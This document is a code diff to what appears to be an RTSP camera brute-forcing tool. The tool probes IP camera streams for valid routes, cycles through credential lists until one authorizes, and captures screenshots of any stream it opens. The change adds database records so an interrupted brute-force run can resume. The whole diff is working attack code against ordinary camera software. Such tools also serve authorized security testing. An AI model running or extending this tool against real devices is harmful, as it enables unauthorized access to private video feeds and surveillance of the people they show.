@@ -18,7 +18,6 @@ DB_SESSION: Session
 DUMMY_ROUTE = "/0x8b6c42"
 MAX_SCREENSHOT_TRIES = 2
 
-
 # 401, 403: credentials are wrong but the route might be okay.
 # 404: route is incorrect but the credentials might be okay.
 # 200: stream is accessed successfully.
@@ -36,86 +35,70 @@ logger = logging.getLogger()
 logger_is_enabled = True
 
 
-def attack(target: Target, port=None, route=None, credentials=None, proxy=None) -> bool:
-    if port is None:
-        port = target.port
+def attack(target: Target, result: Result, route=None, credentials=None) -> bool:
     if route is None:
         route = target.route
     if credentials is None:
         credentials = target.credentials
 
+    target.connect(result)
+    authorized = target.send_describe_request(target.port, route, credentials)
 
-    attack_url = Target.get_rtsp_url(target.ip, port, credentials, route)
-
-    # Create socket connection.
-    connected = target.connect(port)
-    # TODO Add result here
-    if not connected:
-        if logger_is_enabled:
-            exc_info = (
-                target.last_error if target.status is Status.UNIDENTIFIED else None
-            )
-            logger.debug(f"Failed to connect {target}:", exc_info=exc_info)
-        return False
-
-    # Try to authorize: create describe packet and send it.
-    authorized = target.authorize(port, route, credentials)
-    # if logger_is_enabled:
-    request = "\n\t".join(target.packet.split("\r\n")).rstrip()
-    if target.data:
-        response = "\n\t".join(target.data.split("\r\n")).rstrip()
-    else:
-        response = ""
-        append_error_brute_empty(target.ip)
-
-    append_request_log(f"\nattack_url\nSent: {request}\nReceived:\n\t{response}")
-
-    if not authorized:
-        if logger_is_enabled:
-            attack_url = Target.get_rtsp_url(target.ip, port, credentials, route)
-            exc_info = (
-                target.last_error if target.status is Status.UNIDENTIFIED else None
-            )
-            logger.debug(f"Failed to authorize {attack_url}", exc_info=exc_info)
-
-        return False
-
-    return True
+    return bool(authorized)
 
 
-def attack_route(target: Target):
+def get_result_record(target: Target) -> [Result, Session]:
+    session = DB_SESSION()
+    ip_address = target.ip
+    port = target.port
+    result = session.query(Result).filter_by(ip_address=ip_address, port=port).first()
+    if not result:
+        result = Result(ip_address=ip_address, port=port)
+        session.add(result)
+        session.commit()
+
+    return result, session
+
+
+def attack_route(target: Target, result: Result):
     # If the stream responds positively to the dummy route, it means
     # it doesn't require (or respect the RFC) a route and the attack
     # can be skipped.
 
-    session = DB_SESSION()
-    result = Result(ip_address=str(target.ip), port=int(target.port))
-    session.add(result)
-    session.commit()
+    ok = attack(target, result, route=DUMMY_ROUTE)
+    if ok and any(code in target.data for code in ROUTE_OK_CODES):
+        target.routes.append("/")
 
-    for port in PORTS:
-        ok = attack(target, port=port, route=DUMMY_ROUTE)
+        # Save results to db
+        result.set('route', '/')
+        result.set('is_route', True)
 
-        if ok and any(code in target.data for code in ROUTE_OK_CODES):
-            target.port = port
-            target.routes.append("/")
-            # target.disconnect()
+        return target
+
+    # Otherwise, bruteforce the routes.
+    trial = 0
+    route_trial = result.route_trial
+    for route in ROUTES:
+        trial += 1
+        result.set('route_trial', trial)
+        if int(route_trial) > trial:
+            continue
+
+        ok = attack(target, result, route=route)
+        if not ok:
+            break
+        if any(code in target.data for code in ROUTE_OK_CODES):
+            target.routes.append(route)
+
+            result.set('route', route)
+            result.set('is_route', True)
+
             return target
 
-        # Otherwise, bruteforce the routes.
-        for route in ROUTES:
-            ok = attack(target, port=port, route=route)
-            if not ok:
-                break
-            if any(code in target.data for code in ROUTE_OK_CODES):
-                target.port = port
-                target.routes.append(route)
-                # target.disconnect()
-                return target
     # target.disconnect()
 
 
-def attack_credentials(target: Target):
+def attack_credentials(target: Target, result: Result):
     def _log_working_stream():
         if logger_is_enabled:
             logger.debug(
@@ -124,23 +107,42 @@ def attack_credentials(target: Target):
 
     if target.is_authorized:
         _log_working_stream()
+
+        result.set('is_creds', True)
+        result.set('creds', target.credentials)
+
         return target
 
     # If stream responds positively to no credentials, it means
     # it doesn't require them and the attack can be skipped.
-    ok = attack(target, credentials=":")
+    ok = attack(target, result, credentials=":")
     if ok and any(code in target.data for code in CREDENTIALS_OK_CODES):
         _log_working_stream()
+        result.set('is_creds', True)
+        result.set('creds', target.credentials)
+
         return target
 
     # Otherwise, bruteforce the routes.
+    trial = 0
+    creds_trial = result.creds_trial
     for cred in CREDENTIALS:
-        ok = attack(target, credentials=cred)
+        trial += 1
+        result.set('creds_trial', trial)
+        if int(creds_trial) > trial:
+            continue
+
+        ok = attack(target, result, credentials=cred)
         if not ok:
+            result.set('is_creds', False)
             break
         if any(code in target.data for code in CREDENTIALS_OK_CODES):
             target.credentials = cred
             _log_working_stream()
+
+            result.set('is_creds', True)
+            result.set('creds', cred)
+
             return target
 
 
@@ -200,4 +202,4 @@ def get_screenshot(rtsp_url: str, tries=1):
     except Exception as e:
         if logger_is_enabled:
             logger.debug(f"get_screenshot failed with {rtsp_url}: {repr(e)}")
-        return
+        raise e
